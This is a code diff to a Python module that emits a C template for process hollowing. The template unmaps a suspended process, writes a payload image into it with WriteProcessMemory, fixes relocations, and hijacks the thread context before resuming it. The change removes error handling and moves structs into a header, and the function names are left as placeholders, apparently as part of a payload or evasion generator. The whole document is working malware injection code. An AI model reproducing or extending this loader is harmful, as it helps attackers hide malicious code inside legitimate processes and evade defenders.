@@ -16,24 +16,13 @@ class processhollow:
                 "#include <stdlib.h>", 
                 "#include <tlhelp32.h>", 
                 "#include <string.h>",
-                "#include <winternl.h>"]
+                '#include "spawnandinject.h"']
 
     def compilerOptions(self) -> list[str]:
         return []
 
     def codeblocks(self) -> str:
-        return """
-typedef struct RELOCATION_BLOCK {
-	DWORD PageAddress;
-	DWORD BlockSize;
-} RELOCATION_BLOCK, * PRELOCATION_BLOCK;
-
-typedef struct RELOCATION_ENTRY {
-	USHORT Offset : 12;
-	USHORT Type : 4;
-} RELOCATION_ENTRY, * PRELOCATION_ENTRY;
-
-"""
+        return ''
 
     def template(self) -> str:
         return Template("""
@@ -65,10 +54,7 @@ typedef struct RELOCATION_ENTRY {
 
     // Getting The Address Of NtUnmapViewOfSection And Unmapping All Sections
 	printf("[+] Unmapping the Memory Section of Target Process.\\n");
-	if ({NtUnmapViewOfSection}(pi.hProcess, baseAddress)) {{
-		printf("[-] Error to unmap the Section\\n");
-		return 0;
-	}}
+	{NtUnmapViewOfSection}(pi.hProcess, baseAddress);
 
 
 	// Getting The DOS Header And The NT Header 
@@ -86,10 +72,7 @@ typedef struct RELOCATION_ENTRY {
 	ntHeaders->OptionalHeader.ImageBase = (DWORD64)baseAddress;
 
 	// Write The File's Headers To The Allocated Memory In The Suspended Process
-	if (!{WriteProcessMemory}(pi.hProcess, baseAddress, shellcode, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {{
-		printf("Failed to write Headers\\n");
-		return 0;
-	}}
+	{WriteProcessMemory}(pi.hProcess, baseAddress, shellcode, ntHeaders->OptionalHeader.SizeOfHeaders, 0);
 
 	// Write All The Sections From The Mapped File To The Suspended Process
 	PIMAGE_SECTION_HEADER sectionHeader;
@@ -101,9 +84,7 @@ typedef struct RELOCATION_ENTRY {
 		printf("0x%p -- Writing Section: %s\\n", (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress, sectionHeader->Name);
 
 		// Write The Section From The File Into The Allocated Memory
-		if (!{WriteProcessMemory}(pi.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)shellcode + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {{
-			printf("Error Writing Section: %s. At: 0x%p\\n", sectionHeader->Name, (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress);
-		}}
+		{WriteProcessMemory}(pi.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)shellcode + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL);
 	}}
 
 	// Check If There Is an Offset Between the Base Addresses
@@ -164,9 +145,7 @@ typedef struct RELOCATION_ENTRY {
 
 					// Add The Correct Offset To That Address And Write It
 					entryAddress += baseOffset;
-					if (!{WriteProcessMemory}(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {{
-						printf("Error Writing Entry.\\n");
-					}}
+					{WriteProcessMemory}(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
 				}}
 			}}
 		}}
@@ -180,16 +159,10 @@ typedef struct RELOCATION_ENTRY {
 	threadContext.Rcx = entryPoint;
 
 	printf("\\n[+] Setting the Thread Context.\\n");
-	if (!{SetThreadContext}(pi.hThread, &threadContext)) {{
-		printf("Error setting context\\n");
-		return 0;
-	}}
+	{SetThreadContext}(pi.hThread, &threadContext);
 
 	printf("[+] Resuming Thread.\\n");
-	if (!{ResumeThread}(pi.hThread)) {{
-		printf("[-]Error resuming thread\\n");
-		return 0;
-	}}
+	{ResumeThread}(pi.hThread);
 
 	printf("[+] Process Hollowing Technique Done");
 
